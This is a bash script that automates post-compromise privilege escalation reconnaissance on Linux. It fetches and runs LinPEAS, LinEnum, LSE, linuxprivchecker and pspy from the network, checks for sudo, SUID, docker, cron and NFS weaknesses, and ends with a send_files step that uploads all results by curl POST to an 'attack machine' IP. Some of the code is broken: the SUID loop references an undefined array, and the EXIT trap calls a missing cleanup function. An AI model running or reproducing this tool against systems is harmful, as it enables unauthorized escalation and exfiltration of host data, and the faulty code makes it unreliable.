#!/bin/bash

# Linux Privilege Escalation Orchestrator
# Automates running multiple privilege escalation enumeration tools
# Uses existing tools instead of recreating functionality

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
OUTPUT_DIR="${1:-privesc_results}"
TOOLS_DIR="${2:-/tmp/tools}"

# Tool URLs
LINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
LINENUM_URL="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
LSE_URL="https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
LINUXPRIVCHECKER_URL="https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py"
PSPY_URL="https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"

banner() {
    echo -e "${CYAN}"
    echo "================================================================"
    echo "    Linux Privilege Escalation Automation Orchestrator"
    echo "    Leveraging: LinPEAS, LinEnum, LSE, LinuxPrivChecker, pspy"
    echo "================================================================"
    echo -e "${NC}"
}

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [INFO] $1" >> "$OUTPUT_DIR/orchestrator.log"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [WARNING] $1" >> "$OUTPUT_DIR/orchestrator.log"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] $1" >> "$OUTPUT_DIR/orchestrator.log"
}

log_critical() {
    echo -e "${RED}[CRITICAL]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CRITICAL] $1" >> "$OUTPUT_DIR/orchestrator.log"
}

# Setup directories
setup_environment() {
    log_info "Setting up environment..."
    mkdir -p "$OUTPUT_DIR"
    mkdir -p "$TOOLS_DIR"

    # Create results subdirectories
    mkdir -p "$OUTPUT_DIR/linpeas"
    mkdir -p "$OUTPUT_DIR/linenum"
    mkdir -p "$OUTPUT_DIR/lse"
    mkdir -p "$OUTPUT_DIR/linuxprivchecker"
    mkdir -p "$OUTPUT_DIR/pspy"
    mkdir -p "$OUTPUT_DIR/manual_checks"
}

# Download tools if not present
download_tools() {
    log_info "Checking and downloading tools..."

    # LinPEAS
    if [ ! -f "$TOOLS_DIR/linpeas.sh" ]; then
        log_info "Downloading LinPEAS..."
        curl -L "$LINPEAS_URL" -o "$TOOLS_DIR/linpeas.sh" 2>/dev/null || wget "$LINPEAS_URL" -O "$TOOLS_DIR/linpeas.sh" 2>/dev/null
        chmod +x "$TOOLS_DIR/linpeas.sh"
    fi

    # LinEnum
    if [ ! -f "$TOOLS_DIR/LinEnum.sh" ]; then
        log_info "Downloading LinEnum..."
        curl -L "$LINENUM_URL" -o "$TOOLS_DIR/LinEnum.sh" 2>/dev/null || wget "$LINENUM_URL" -O "$TOOLS_DIR/LinEnum.sh" 2>/dev/null
        chmod +x "$TOOLS_DIR/LinEnum.sh"
    fi

    # Linux Smart Enumeration
    if [ ! -f "$TOOLS_DIR/lse.sh" ]; then
        log_info "Downloading Linux Smart Enumeration..."
        curl -L "$LSE_URL" -o "$TOOLS_DIR/lse.sh" 2>/dev/null || wget "$LSE_URL" -O "$TOOLS_DIR/lse.sh" 2>/dev/null
        chmod +x "$TOOLS_DIR/lse.sh"
    fi

    # LinuxPrivChecker
    if [ ! -f "$TOOLS_DIR/linuxprivchecker.py" ]; then
        log_info "Downloading LinuxPrivChecker..."
        curl -L "$LINUXPRIVCHECKER_URL" -o "$TOOLS_DIR/linuxprivchecker.py" 2>/dev/null || wget "$LINUXPRIVCHECKER_URL" -O "$TOOLS_DIR/linuxprivchecker.py" 2>/dev/null
        chmod +x "$TOOLS_DIR/linuxprivchecker.py"
    fi

    # pspy
    if [ ! -f "$TOOLS_DIR/pspy64" ]; then
        log_info "Downloading pspy64..."
        curl -L "$PSPY_URL" -o "$TOOLS_DIR/pspy64" 2>/dev/null || wget "$PSPY_URL" -O "$TOOLS_DIR/pspy64" 2>/dev/null
        chmod +x "$TOOLS_DIR/pspy64"
    fi
}

# Run LinPEAS
run_linpeas() {
    log_info "Running LinPEAS (comprehensive enumeration)..."
    if [ -f "$TOOLS_DIR/linpeas.sh" ]; then
        timeout 600 bash "$TOOLS_DIR/linpeas.sh" > "$OUTPUT_DIR/linpeas/linpeas_output.txt" 2>&1

        # Extract critical findings
        grep -i "CRITICAL\|HIGH\|99%" "$OUTPUT_DIR/linpeas/linpeas_output.txt" > "$OUTPUT_DIR/linpeas/critical_findings.txt" 2>/dev/null

        log_info "LinPEAS completed. Check $OUTPUT_DIR/linpeas/ for results"
    else
        log_error "LinPEAS not found"
    fi
}

# Run LinEnum
run_linenum() {
    log_info "Running LinEnum (detailed enumeration)..."
    if [ -f "$TOOLS_DIR/LinEnum.sh" ]; then
        timeout 300 bash "$TOOLS_DIR/LinEnum.sh" -t > "$OUTPUT_DIR/linenum/linenum_output.txt" 2>&1
        log_info "LinEnum completed. Check $OUTPUT_DIR/linenum/ for results"
    else
        log_error "LinEnum not found"
    fi
}

# Run Linux Smart Enumeration
run_lse() {
    log_info "Running Linux Smart Enumeration..."
    if [ -f "$TOOLS_DIR/lse.sh" ]; then
        # Run with different verbosity levels
        timeout 180 bash "$TOOLS_DIR/lse.sh" -l1 > "$OUTPUT_DIR/lse/lse_level1.txt" 2>&1
        timeout 300 bash "$TOOLS_DIR/lse.sh" -l2 > "$OUTPUT_DIR/lse/lse_level2.txt" 2>&1
        log_info "LSE completed. Check $OUTPUT_DIR/lse/ for results"
    else
        log_error "LSE not found"
    fi
}

# Run LinuxPrivChecker
run_linuxprivchecker() {
    log_info "Running LinuxPrivChecker..."
    if [ -f "$TOOLS_DIR/linuxprivchecker.py" ]; then
        if command -v python3 &> /dev/null; then
            timeout 180 python3 "$TOOLS_DIR/linuxprivchecker.py" > "$OUTPUT_DIR/linuxprivchecker/output.txt" 2>&1
        elif command -v python &> /dev/null; then
            timeout 180 python "$TOOLS_DIR/linuxprivchecker.py" > "$OUTPUT_DIR/linuxprivchecker/output.txt" 2>&1
        else
            log_warning "Python not found, skipping LinuxPrivChecker"
            return
        fi
        log_info "LinuxPrivChecker completed. Check $OUTPUT_DIR/linuxprivchecker/ for results"
    else
        log_error "LinuxPrivChecker not found"
    fi
}

# Run pspy for process monitoring
run_pspy() {
    log_info "Running pspy (process monitoring - 60 seconds)..."
    if [ -f "$TOOLS_DIR/pspy64" ]; then
        timeout 60 "$TOOLS_DIR/pspy64" > "$OUTPUT_DIR/pspy/pspy_output.txt" 2>&1 &
        PSPY_PID=$!
        log_info "pspy running in background (PID: $PSPY_PID) for 60 seconds..."
        wait $PSPY_PID 2>/dev/null
        log_info "pspy completed. Check $OUTPUT_DIR/pspy/ for results"
    else
        log_error "pspy64 not found"
    fi
}

# Quick manual checks using system tools
run_manual_checks() {
    log_info "Running additional manual checks..."

    {
        echo "=== QUICK SYSTEM INFO ==="
        echo "User: $(whoami)"
        echo "Groups: $(groups)"
        echo "Sudo version: $(sudo --version 2>/dev/null | head -1)"
        echo "Kernel: $(uname -a)"
        echo

        echo "=== SUDO PERMISSIONS ==="
        sudo -l 2>/dev/null || echo "Cannot check sudo permissions"
        echo

        echo "=== INTERESTING SUID BINARIES ==="
        find / -perm -4000 2>/dev/null | grep -E "(nmap|vim|find|python|perl|ruby|php|gcc|gdb)" || echo "No interesting SUID binaries found"
        echo

        echo "=== WRITABLE /etc/passwd ==="
        ls -la /etc/passwd 2>/dev/null
        echo

        echo "=== DOCKER SOCKET ==="
        ls -la /var/run/docker.sock 2>/dev/null || echo "Docker socket not accessible"
        echo

        echo "=== CAPABILITIES ==="
        getcap -r / 2>/dev/null | head -10 || echo "getcap not available"
        echo

        echo "=== CRON JOBS ==="
        ls -la /etc/cron* 2>/dev/null
        crontab -l 2>/dev/null || echo "No user crontab"

    } > "$OUTPUT_DIR/manual_checks/quick_checks.txt"
}

# Check for common privilege escalation vectors
check_common_vectors() {
    log_info "Checking common privilege escalation vectors..."

    {
        echo "=== COMMON PRIVESC VECTORS CHECK ==="
        echo "Timestamp: $(date)"
        echo

        # Check for writable /etc/passwd
        if [ -w /etc/passwd ]; then
            echo "[CRITICAL] /etc/passwd is writable!"
        fi

        # Check for NOPASSWD sudo
        if sudo -l 2>/dev/null | grep -q NOPASSWD; then
            echo "[CRITICAL] NOPASSWD sudo entries found!"
        fi

        # Check for Docker group membership
        if groups | grep -q docker; then
            echo "[CRITICAL] User is in docker group!"
        fi

        # Check for interesting SUID binaries
        DANGEROUS_SUID=("nmap" "vim" "nano" "find" "python" "perl" "ruby" "php" "gcc" "gdb")
        for binary in "${DANGEROUS_UID[@]}"; do
            if find / -name "$binary" -perm -4000 2>/dev/null | grep -q .; then
                echo "[CRITICAL] Dangerous SUID binary found: $binary"
            fi
        done

        # Check for writable service files
        if find /etc/systemd/system -writable 2>/dev/null | grep -q .; then
            echo "[HIGH] Writable systemd service files found!"
        fi

        # Check for NFS no_root_squash
        if grep -q "no_root_squash" /etc/exports 2>/dev/null; then
            echo "[HIGH] NFS no_root_squash configuration found!"
        fi

    } > "$OUTPUT_DIR/manual_checks/common_vectors.txt"
}

# Generate consolidated report
generate_report() {
    log_info "Generating consolidated report..."

    {
        echo "================================================================"
        echo "    LINUX PRIVILEGE ESCALATION AUTOMATION REPORT"
        echo "================================================================"
        echo "Scan Date: $(date)"
        echo "Target: $(hostname)"
        echo "User: $(whoami)"
        echo "Output Directory: $OUTPUT_DIR"
        echo

        echo "=== TOOLS EXECUTED ==="
        echo "✓ LinPEAS - Comprehensive enumeration"
        echo "✓ LinEnum - Detailed system enumeration"
        echo "✓ LSE - Smart enumeration (Level 1 & 2)"
        echo "✓ LinuxPrivChecker - Python-based checker"
        echo "✓ pspy - Process monitoring"
        echo "✓ Manual checks - Custom verification"
        echo

        echo "=== CRITICAL FINDINGS SUMMARY ==="
        echo "Check the following files for detailed analysis:"
        echo "- $OUTPUT_DIR/linpeas/critical_findings.txt"
        echo "- $OUTPUT_DIR/manual_checks/common_vectors.txt"
        echo

        echo "=== RECOMMENDED ANALYSIS ORDER ==="
        echo "1. Review critical findings from LinPEAS"
        echo "2. Check manual common vectors analysis"
        echo "3. Examine LSE Level 2 output for detailed enumeration"
        echo "4. Review pspy output for scheduled tasks/processes"
        echo "5. Cross-reference findings across all tools"
        echo

        echo "=== OUTPUT FILES ==="
        find "$OUTPUT_DIR" -type f -name "*.txt" | sort
        echo

        echo "=== NEXT STEPS ==="
        echo "1. Analyze all generated reports"
        echo "2. Prioritize findings by criticality"
        echo "3. Test identified privilege escalation vectors"
        echo "4. Document successful exploitation methods"
        echo

    } > "$OUTPUT_DIR/consolidated_report.txt"

    log_info "Consolidated report generated: $OUTPUT_DIR/consolidated_report.txt"
}

ask_yes_no() {
    local PROMPT="$1"
    local DEFAULT="${2:-y}"  # Default to 'y' if not provided

    local CHOICE
    while true; do
        if [[ "$DEFAULT" == "y" ]]; then
            read -rp "$PROMPT [Y/n] " CHOICE
            CHOICE="${CHOICE:-y}"
        else
            read -rp "$PROMPT [y/N] " CHOICE
            CHOICE="${CHOICE:-n}"
        fi

        case "$CHOICE" in
            [Yy]) return 0 ;;  # yes
            [Nn]) return 1 ;;  # no
            *) echo "Please answer y or n." ;;
        esac
    done
}

# Send files into attack machine
send_files() {
    read -rp "Enter IP address to send files to: " IP

    local DIR=$OUTPUT_DIR
    if [[ -n "$IP" ]]; then
        if [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            for FILE in "$DIR"/*; do
                if [[ -f "$FILE" ]]; then
                    echo "Sending $FILE..."
                    curl -X POST "http://$IP:8000/upload" -F "files=@$FILE"
                fi
            done
        else
            echo "Invalid IP address format: $IP"
            return 1
        fi
    else
        echo "Missing IP address"
        return 1
    fi
}

# Main execution function
main() {
    banner

    # Check if running as root
    if [ "$EUID" -eq 0 ]; then
        log_warning "Running as root - some checks may not be relevant"
    fi

    setup_environment
    download_tools

    log_info "Starting automated privilege escalation enumeration..."

    # Run all tools
    run_linpeas &
    LINPEAS_PID=$!

    run_linenum &
    LINENUM_PID=$!

    run_lse &
    LSE_PID=$!

    run_linuxprivchecker &
    LINUXPRIVCHECKER_PID=$!

    # Wait for background processes
    wait $LINPEAS_PID 2>/dev/null
    wait $LINENUM_PID 2>/dev/null
    wait $LSE_PID 2>/dev/null
    wait $LINUXPRIVCHECKER_PID 2>/dev/null

    # Run pspy and manual checks
    run_pspy
    run_manual_checks
    check_common_vectors

    generate_report

    if ask_yes_no "Do you want to send files? \n (setup first python-uploadserver)" "y"; then
        echo "Continuing..."
        send_files
    fi

    echo -e "${GREEN}"
    echo "================================================================"
    echo "    PRIVILEGE ESCALATION ENUMERATION COMPLETED"
    echo "================================================================"
    echo -e "${NC}"
    echo -e "${CYAN}Results saved in: $OUTPUT_DIR${NC}"
    echo -e "${CYAN}Main report: $OUTPUT_DIR/consolidated_report.txt${NC}"
    echo -e "${YELLOW}Review critical findings and prioritize testing!${NC}"
}

# Signal handling
trap cleanup EXIT

# Execute main function
main "$@"
